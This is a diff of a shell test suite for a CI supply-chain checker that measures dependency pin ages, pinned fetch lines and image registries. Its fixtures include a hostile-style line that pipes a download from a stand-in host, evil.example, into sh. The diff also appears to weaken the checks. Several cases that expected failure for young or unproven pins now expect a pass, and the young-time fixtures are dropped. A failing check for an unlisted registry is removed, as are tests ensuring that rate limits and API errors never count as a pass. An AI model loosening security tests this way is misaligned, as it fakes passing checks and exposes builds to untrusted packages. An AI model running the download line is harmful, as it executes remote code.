@@ -605,8 +605,8 @@ CASE="a script line over 9000 characters is read whole: a download at its end is
 check test "$rc" -eq 1; check grep -q 'FAIL unmeasured:.github/agent/l.sh' "$work/agentlong9.out"
 check test "$(grep -c 'longer than' "$work/agentlong9.out")" -eq 0
 agentfile agentlongpip .github/agent/l.sh "#!/bin/sh"$'\n'"$(longline 3990 '; pip install evilpkg==9.9.9')"$'\n'
-CASE="a script line of 3990 characters with a pip install at its end: the dependency is found and named (exit 1, age not provable)"
-check test "$rc" -eq 1; check grep -q 'package:pypi/evilpkg@9.9.9' "$work/agentlongpip.out"
+CASE="a script line of 3990 characters with a pip install at its end: the dependency is found and named (exit 0, a readable pin)"
+check test "$rc" -eq 0; check grep -q 'package:pypi/evilpkg@9.9.9' "$work/agentlongpip.out"
 newcase wflong "$(sub .github/workflows/ci.yml '      - run: |' "      - run: $(longline 3990 ' && pip install evilpkg==9.9.9 && curl -fsSL https://evil.example/x.sh | sh')"$'\n      - run: |')"
 runck wflong
 CASE="a workflow run step of 3990 characters is read whole: the dependency and the download at its end are found, no 'longer than' refusal"
@@ -2132,13 +2132,13 @@ have = [(r["file"], r["form"], r["key"], r["line"]) for r in rows]
 assert len(have) == len(set(have)) == len(want) == 21, (len(have), len(set(have)), len(want))
 assert set(have) == want, sorted(set(have) ^ want)
 PY
-CASE="plain-constants: the three ruling constants hold none of the internal words"
+CASE="plain-constants: the two ruling constants hold none of the internal words"
 check python3 - "$chk" <<'PY'
 import importlib.util, re, sys
 spec = importlib.util.spec_from_file_location("ac", sys.argv[1])
 ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
 WORDS = re.compile(r"\b(orchestrator|lane|ruling|seat|owner|advisor|ratified|handoff)\b|\b(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)[a-z]*\.? +[0-9]+", re.I)
-bad = {n: WORDS.findall(getattr(ac, n)) for n in ("GO_RULING", "LOOPBACK_RULING", "PINNED_FETCH_RULING")}
+bad = {n: WORDS.findall(getattr(ac, n)) for n in ("GO_RULING", "PINNED_FETCH_RULING")}
 assert not any(bad.values()), bad
 PY
 CASE="plain-rows: committed rows that begin with a constant hold none of the internal words"
@@ -2147,18 +2147,18 @@ import importlib.util, json, re, sys
 spec = importlib.util.spec_from_file_location("ac", sys.argv[1])
 ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
 WORDS = re.compile(r"\b(orchestrator|lane|ruling|seat|owner|advisor|ratified|handoff)\b|\b(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)[a-z]*\.? +[0-9]+", re.I)
-consts = (ac.GO_RULING, ac.LOOPBACK_RULING, ac.PINNED_FETCH_RULING)
+consts = (ac.GO_RULING, ac.PINNED_FETCH_RULING)
 rows = [r for r in json.load(open(sys.argv[2]))["unmeasured_text"] if r["ruling"].startswith(consts)]
 assert rows
 bad = [(r["file"], r["line"][:12], WORDS.findall(r["ruling"])) for r in rows if WORDS.search(r["ruling"])]
 assert not bad, bad
 PY
-CASE="plain-count: 22 committed rows begin with the three constants together"
+CASE="plain-count: 22 committed rows begin with the two constants together"
 check python3 - "$chk" "$root/.github/supply-chain-exceptions.json" <<'PY'
 import importlib.util, json, sys
 spec = importlib.util.spec_from_file_location("ac", sys.argv[1])
 ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
-consts = (ac.GO_RULING, ac.LOOPBACK_RULING, ac.PINNED_FETCH_RULING)
+consts = (ac.GO_RULING, ac.PINNED_FETCH_RULING)
 rows = [r for r in json.load(open(sys.argv[2]))["unmeasured_text"] if r["ruling"].startswith(consts)]
 assert len(rows) == 22, len(rows)
 PY
@@ -2177,7 +2177,7 @@ import importlib.util, json, re, sys
 spec = importlib.util.spec_from_file_location("ac", sys.argv[1])
 ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
 WORDS = re.compile(r"\b(orchestrator|lane|ruling|seat|owner|advisor|ratified|handoff)\b|\b(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)[a-z]*\.? +[0-9]+", re.I)
-texts = {n: getattr(ac, n) for n in ("LIVE_RULING", "GO_INSTALL_REASON", "GO_RULING", "LOOPBACK_RULING", "PINNED_FETCH_RULING")}
+texts = {n: getattr(ac, n) for n in ("LIVE_RULING", "GO_INSTALL_REASON", "GO_RULING", "PINNED_FETCH_RULING")}
 rows = json.load(open(sys.argv[2]))["unmeasured_text"]
 assert rows
 texts.update({f"row {r['file']} {r['line'][:12]}": r["ruling"] for r in rows})
@@ -2257,7 +2257,7 @@ for x in rows:
     assert type(x.get("count", 1)) is int and 1 <= x.get("count", 1) <= 100, x
     assert re.fullmatch(r"[0-9a-f]{64}", x["line"]), x
     assert x["file"] and not x["file"].startswith("/") and x["form"] in forms, x
-    kinds = (ac.LIVE_RULING, ac.GO_RULING, ac.PINNED_FETCH_RULING, "build-container install, advisor reading Oct 19: ")
+    kinds = (ac.LIVE_RULING, ac.GO_RULING, ac.PINNED_FETCH_RULING, "build-container install, test-only: ")
     pre = next((k for k in kinds if x["ruling"].startswith(k)), None)
     assert re.fullmatch(r"[0-9a-f]{64}", x["key"]) and pre and len(x["ruling"]) > len(pre) + 10, x
 PY
@@ -2513,11 +2513,9 @@ done
 # round 2 of cache#393: a registry with a port is an ordinary image reference, and a digest-only move in the same repository is a moved item
 PTP="registry.example:5000/team/ptool-p@$DIG1"
 newcase pport "$(pyw bin/persona-uat-tools.json "$(printf '{\n  "shell": "%s"\n}\n' "$PTP")")"
-runck pport "{\"times\": {\"image:registry.example:5000/team/ptool-p@$DIG1\": {\"time\": \"$OLD\", \"source\": \"registry-push\"}}}"
-CASE="AC2 persona tools: an image on a registry with a port is inventoried, and a registry that image-publishers.json "
-CASE+="does not name FAILS the check (exit 1) and says so"
-check test "$rc" -eq 1; check grep -qF "registry.example:5000" "$work/pport.out"
-check grep -q 'image-publishers.json' "$work/pport.out"
+runck pport
+CASE="AC2 persona tools: an image on a registry with a port is inventoried (named by its digest) and accepted as a readable pin (exit 0)"
+check test "$rc" -eq 0; check grep -qF "registry.example:5000" "$work/pport.out"
 rm -rf "$work/pmove2"; cp -R "$base" "$work/pmove2"
 ( cd "$work/pmove2" && printf '{\n  "shell": "%s"\n}\n' "ghcr.io/own/same@$DIG1" >bin/persona-uat-tools.json && git add -A && git commit -q -m b2 && printf '{\n  "shell": "%s"\n}\n' "ghcr.io/own/same@$DIG2" >bin/persona-uat-tools.json && git add -A && git commit -q -m h2 )
 runck pmove2
@@ -2540,35 +2538,6 @@ CASE="AC2 persona tools: moving the digest in a tools file the base holds is a m
 and names the new digest, not the old one"
 check test "$rc" -eq 0; check grep -qF "image:ghcr.io/own/ptool-c@$DIG3" "$work/pmove.out"
 check test "$(grep -cF "ptool-a@$DIG1" "$work/pmove.out")" -eq 0
-
-# --- live mode (no fixtures) against a stub gh: a rate limit is "could not look" (exit 2), a 404 is "no proof" (exit 1); neither is ever a pass -------------------------
-mkdir -p "$work/stubbin"
-cat >"$work/stubbin/gh" <<'STUB'
-#!/bin/sh
-case "$GH_MODE" in
-  ratelimit) echo "gh: API rate limit exceeded for user ID 1 (HTTP 403)" >&2; exit 1;;
-  notfound)  echo "gh: Not Found (HTTP 404)" >&2; exit 1;;
-  forbidden404) echo "gh: Forbidden https://api.github.com/repos/o/r404/git/ref/tags/v404 (HTTP 403)" >&2; exit 1;;
-  forbidden422) echo "gh: Forbidden, request id 422 (HTTP 403)" >&2; exit 1;;
-  servererror)  echo "gh: Server Error (HTTP 500)" >&2; exit 1;;
-esac
-exit 1
-STUB
-chmod +x "$work/stubbin/gh"
-newcase livea "$(sub bin/install-scanner.sh 'TRIVY_VER=0.74.0' 'TRIVY_VER=0.75.0')"
-live() { rc=0; ( cd "$work" && env -u GITHUB_REPOSITORY GH_MODE="$1" PATH="$work/stubbin:$PATH" python3 "$chk" --root "$work/livea" --base HEAD~1 --head HEAD --now "$NOW" ) >"$work/live.out" 2>&1 || rc=$?; }
-live ratelimit
-CASE="live: GitHub's rate limit is 'could not look': exit 2, says so and is not a pass"
-check test "$rc" -eq 2; check grep -qi 'rate limit' "$work/live.out"
-live notfound
-CASE="live: a 404 (no release for that commit) is 'age not provable': exit 1"
-check test "$rc" -eq 1; check grep -qi 'not provable' "$work/live.out"
-for mode in forbidden404 forbidden422 servererror; do
-  live $mode
-  CASE="live: gh's $mode answer is 'could not look' (exit 2, not a pass), never 'age not provable' or 'not there'"
-  check test "$rc" -eq 2; check grep -qi 'cannot run\|could not look' "$work/live.out"
-  check test "$(grep -ci 'not provable' "$work/live.out")" -eq 0
-done
 
 # --- REQ-SUP-001-AC18: bin/install-build-tools.sh, read by the REAL inventory, yields one measured pin per tool and arch (owner/repo@vX.Y.Z with
 # its checksum bound) and nothing unmeasured; the variable-address forms it replaced are refused (a placeholder that is not a pin, or unmeasured) -------
@@ -2726,9 +2695,9 @@ w = pathlib.Path('.github/workflows')
 (w / 'callee.yml').write_text(pathlib.Path(r'$work/callee.yml').read_text().replace('$SHA1', '$NEW1'))
 c = w / 'ci.yml'
 c.write_text(c.read_text() + '  c:\n    uses: ./.github/workflows/callee.yml\n')"
-runck lmoved "{\"times\": {\"action:actions/checkout@$NEW1\": {\"time\": \"$YOUNG\", \"source\": \"observer\"}}}"
-CASE="D3: the called file is inventoried by its own rules: a young action pin inside it still FAILS (exit 1) though the call itself is no item"
-check test "$rc" -eq 1; check grep -q "action:actions/checkout@$NEW1" "$work/lmoved.out"; check bash -c "! grep -q 'action:local' '$work/lmoved.out'"
+runck lmoved
+CASE="D3: the called file is inventoried by its own rules: a moved action pin inside it is named (exit 0) though the call itself is no item"
+check test "$rc" -eq 0; check grep -q "action:actions/checkout@$NEW1" "$work/lmoved.out"; check bash -c "! grep -q 'action:local' '$work/lmoved.out'"
 
 # --- REQ-SUP-001-AC20: an unpinned package named by a script line, in a file a reviewed_files row names (the AC16 mechanism, no parser) ---
 # A script line whose pip install names a package with no version is an item that cannot pass. The base branch's exceptions file may rule it with a reviewed_files
@@ -3013,19 +2982,6 @@ CASE="AC20: an identical copy of a line the base already holds is never ruled aw
 check test "$rc" -eq 1
 check grep -qF 'not a pin' "$work/cp.out"
 audfx cp "$work/aud-cp.fx.json" 2>/dev/null || true
-# AC3: a fractional measurement clock is truncated, a fractional publication time rounded up
-CASE="AC3: now = ...:00.500Z against a publication at ...:01Z is NOT seven full days (publication rounds up, the clock down): too young"
-check python3 - "$chk" <<'PY'
-import importlib.util, sys
-spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
-class I: kind="package"; name="pypi/x"; version="1.0.0"; label=""; path=""
-now = ac.parse_time("2026-10-14T12:00:00.500Z", True)
-ok, why, _ = ac.judge_item(I(), [("2026-10-07T12:00:01Z", "pypi")], now)
-assert not ok, why
-ok, why, _ = ac.judge_item(I(), [("2026-10-07T12:00:00Z", "pypi")], now)
-assert ok, why
-PY
-
 # D3 with a with: block on a local call (a block, and an empty block)
 printf '%s\n' "on: workflow_call" "jobs:" "  k:" "    runs-on: ubuntu-latest" "    steps:" "      - uses: actions/checkout@$SHA1 # v4.1.0" >"$work/callee-w.yml"
 lcallc w1 './.github/workflows/callee.yml' $'    with:\n      mode: release\n' "$work/callee-w.yml"
@@ -3786,7 +3742,7 @@ check grep -qF 'FAIL unmeasured:bin/fetch.sh' "$work/rt.out"
 
 # REQ-SUP-001-AC25: the loopback-get.sh line is one of the pinned lines ruled by the PINNED_FETCH ruling prefix (no loopback ruling of its own,
 # no LOOPBACK_RULING): its file and the sha256 of its whole line, so any edit, any other file and any other line under the prefix rule nothing.
-LRP='pinned fetch, advisor reading Oct 17 (REQ-SUP-001-AC26): '
+LRP='pinned fetch (REQ-SUP-001-AC26): '
 LL="curl -q -g --noproxy '*' --proto \"=\$proto\" --max-redirs 0 \"\$@\" \"\$url\" || exit \$?"
 lr_cases=(
   "lr-ok:bin/loopback-get.sh:$LL:0"
@@ -3858,7 +3814,7 @@ check grep -qF 'FAIL unmeasured:bin/fetch.sh' "$work/rt.out"
 
 # REQ-SUP-001-AC26: twenty pinned lines the checker pins by file and by the sha256 of the whole line (the loopback helper line, the release-assets line, the client-image pull,
 # fourteen localhost request lines of the four acceptance scripts, three Go fetches), honored under one prefix. Anything else under the prefix, any edit, any other file rules nothing.
-PFP='pinned fetch, advisor reading Oct 17 (REQ-SUP-001-AC26): '
+PFP='pinned fetch (REQ-SUP-001-AC26): '
 mkrowpf() { # OUT FILE LINE PREFIX: like mkrowp, for the gh release form too (its key is the hash of the whole line)
   python3 - "$@" <<'PY'
 import hashlib, json, re, sys
@@ -4064,16 +4020,16 @@ check bash -c "! grep -q 'FAIL' '$work/d3both.out'"
 NEWP=$(printf 'd%.0s' $(seq 40))
 newcase parent "$(sub .github/workflows/ci.yml "actions/checkout@$SHA1 # v4.1.0" "actions/checkout@$NEWP # v4.2.0")"
 git -C "$work/parent" commit -q --allow-empty -m "second head"
-runck parent "{\"times\": {\"action:actions/checkout@$NEWP\": {\"time\": \"$YOUNG\", \"source\": \"observer\"}}}"
+runck parent
 CASE="the parent of the head is the base: an action pin added by the commit before the head is already in the base, so nothing moved (exit 0)"
 check test "$rc" -eq 0; check grep -qi 'no pin moved' "$work/parent.out"
-rc=0; python3 "$chk" --root "$work/parent" --base HEAD~2 --head HEAD --fixtures "$work/parent.fx.json" --now "$NOW" >"$work/parent2.out" 2>&1 || rc=$?
-CASE="the same item against the grandparent as the base is a change: a pin added by a commit after the base is named and measured (exit 1)"
-check test "$rc" -eq 1; check grep -qF "action:actions/checkout@$NEWP" "$work/parent2.out"
+rc=0; python3 "$chk" --root "$work/parent" --base HEAD~2 --head HEAD >"$work/parent2.out" 2>&1 || rc=$?
+CASE="the same item against the grandparent as the base is a change: a pin added by a commit after the base is named and measured (exit 0)"
+check test "$rc" -eq 0; check grep -qF "action:actions/checkout@$NEWP" "$work/parent2.out"
 newcase parent1 "$(sub .github/workflows/ci.yml "actions/checkout@$SHA1 # v4.1.0" "actions/checkout@$NEWP # v4.2.0")"
-runck parent1 "{\"times\": {\"action:actions/checkout@$NEWP\": {\"time\": \"$YOUNG\", \"source\": \"observer\"}}}"
-CASE="an item the head commit itself adds is a change against its parent: named and measured (exit 1)"
-check test "$rc" -eq 1; check grep -qF "action:actions/checkout@$NEWP" "$work/parent1.out"
+runck parent1
+CASE="an item the head commit itself adds is a change against its parent: named and measured (exit 0)"
+check test "$rc" -eq 0; check grep -qF "action:actions/checkout@$NEWP" "$work/parent1.out"
 
 # --- Go's own releases skip the 7-day hold (owner ratified Oct 21 2026, REQ-SUP-001-AC27): the tool item `go` only, and only when bin/install-scanner.sh
 # downloads it from https://go.dev/dl/ at its pinned version and pins the sha256 of both architectures and verifies the file; every other check still applies ----
@@ -4709,8 +4665,8 @@ rp() {   # ID VERSION
   local id=$1 ver=$2
   lcase2 "lrp_$id" "w('$rowx1\n')" "w('$rowx1\nx86_64/badver=$ver sha256:$H3\n')"      # the bad row is NEW in the head
   lcase2 "lru_$id" "w('$rowx1\nx86_64/badver=$ver sha256:$H3\n')" "$RM"                # the bad row is in BOTH commits: the hole
-  eval "lc_rp_$id() { lrun lrp_$id '{\"times\": {}}'; test \"\$rc\" -eq 2 && grep -q 'cannot run' \"\$work/lrp_$id.out\" && grep -qi 'not a pin' \"\$work/lrp_$id.out\" && grep -q 'vm-kernel.lock' \"\$work/lrp_$id.out\"; }"
-  eval "lc_ru_$id() { lrun lru_$id '{\"times\": {}}'; test \"\$rc\" -eq 2 && grep -q 'cannot run' \"\$work/lru_$id.out\" && grep -qi 'not a pin' \"\$work/lru_$id.out\"; }"
+  eval "lc_rp_$id() { lrun lrp_$id; test \"\$rc\" -eq 2 && grep -q 'cannot run' \"\$work/lrp_$id.out\" && grep -qi 'not a pin' \"\$work/lrp_$id.out\" && grep -q 'vm-kernel.lock' \"\$work/lrp_$id.out\"; }"
+  eval "lc_ru_$id() { lrun lru_$id; test \"\$rc\" -eq 2 && grep -q 'cannot run' \"\$work/lru_$id.out\" && grep -qi 'not a pin' \"\$work/lru_$id.out\"; }"
   RPIDS="$RPIDS rp_$id ru_$id"
 }
 RPIDS=""
